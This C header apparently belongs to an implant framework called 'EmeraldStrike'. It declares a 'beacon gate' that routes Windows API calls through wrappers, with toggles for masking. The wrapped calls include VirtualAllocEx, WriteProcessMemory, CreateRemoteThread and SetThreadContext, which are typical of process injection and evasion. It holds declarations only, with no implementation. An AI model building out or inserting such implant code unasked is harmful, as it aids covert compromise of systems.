#ifndef EMERALDSTRIKE_BEACON_GATE_IMPL_H
#define EMERALDSTRIKE_BEACON_GATE_IMPL_H

#include <windows.h>
#include "../beacon_gate.h"

typedef struct _INSTANCE* PINSTANCE;

VOID beacon_gate_dispatch(PINSTANCE inst, PFUNCTION_CALL fc);

VOID beacon_gate_enable(PINSTANCE inst);
VOID beacon_gate_disable(PINSTANCE inst);
VOID beacon_gate_enable_masking(PINSTANCE inst);
VOID beacon_gate_disable_masking(PINSTANCE inst);

LPVOID  gate_VirtualAlloc(PINSTANCE inst, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
LPVOID  gate_VirtualAllocEx(PINSTANCE inst, HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
BOOL    gate_VirtualProtect(PINSTANCE inst, LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
BOOL    gate_VirtualProtectEx(PINSTANCE inst, HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
BOOL    gate_VirtualFree(PINSTANCE inst, LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType);
BOOL    gate_VirtualFreeEx(PINSTANCE inst, HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType);
SIZE_T  gate_VirtualQuery(PINSTANCE inst, LPCVOID lpAddress, PMEMORY_BASIC_INFORMATION lpBuffer, SIZE_T dwLength);
SIZE_T  gate_VirtualQueryEx(PINSTANCE inst, HANDLE hProcess, LPCVOID lpAddress, PMEMORY_BASIC_INFORMATION lpBuffer, SIZE_T dwLength);
HANDLE  gate_CreateThread(PINSTANCE inst, LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
HANDLE  gate_CreateRemoteThread(PINSTANCE inst, HANDLE hProcess, LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
HANDLE  gate_OpenProcess(PINSTANCE inst, DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId);
HANDLE  gate_OpenThread(PINSTANCE inst, DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwThreadId);
BOOL    gate_CloseHandle(PINSTANCE inst, HANDLE hObject);
BOOL    gate_GetThreadContext(PINSTANCE inst, HANDLE hThread, LPCONTEXT lpContext);
BOOL    gate_SetThreadContext(PINSTANCE inst, HANDLE hThread, const CONTEXT* lpContext);
DWORD   gate_ResumeThread(PINSTANCE inst, HANDLE hThread);
HANDLE  gate_CreateFileMappingA(PINSTANCE inst, HANDLE hFile, LPSECURITY_ATTRIBUTES lpAttributes, DWORD flProtect, DWORD dwMaxSizeHigh, DWORD dwMaxSizeLow, LPCSTR lpName);
LPVOID  gate_MapViewOfFile(PINSTANCE inst, HANDLE hFileMappingObject, DWORD dwDesiredAccess, DWORD dwFileOffsetHigh, DWORD dwFileOffsetLow, SIZE_T dwNumberOfBytesToMap);
BOOL    gate_UnmapViewOfFile(PINSTANCE inst, LPCVOID lpBaseAddress);
BOOL    gate_DuplicateHandle(PINSTANCE inst, HANDLE hSourceProcessHandle, HANDLE hSourceHandle, HANDLE hTargetProcessHandle, LPHANDLE lpTargetHandle, DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwOptions);
BOOL    gate_ReadProcessMemory(PINSTANCE inst, HANDLE hProcess, LPCVOID lpBaseAddress, LPVOID lpBuffer, SIZE_T nSize, SIZE_T* lpNumberOfBytesRead);
BOOL    gate_WriteProcessMemory(PINSTANCE inst, HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T* lpNumberOfBytesWritten);
DWORD   gate_WaitForSingleObject(PINSTANCE inst, HANDLE hHandle, DWORD dwMilliseconds);
VOID    gate_Sleep(PINSTANCE inst, DWORD dwMilliseconds);
VOID    gate_ExitThread(PINSTANCE inst, DWORD dwExitCode);

#endif // EMERALDSTRIKE_BEACON_GATE_IMPL_H
